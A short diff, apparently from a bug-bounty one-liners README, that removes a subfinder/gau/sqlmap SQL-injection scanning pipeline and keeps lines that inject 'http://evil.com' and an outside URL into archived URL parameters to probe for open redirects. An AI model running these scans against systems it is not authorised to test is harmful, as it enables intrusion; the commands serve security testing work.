@@ -51,10 +51,6 @@ waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while
 ```
 
 ```
-subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
-```
-
-```
 gau http://testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archive | cut -f 3- -d ':' | qsreplace "https://cybertix.in" | httpx -silent -status-code -location
 ```
 ────────────────────────────────────────────────────────────────────────
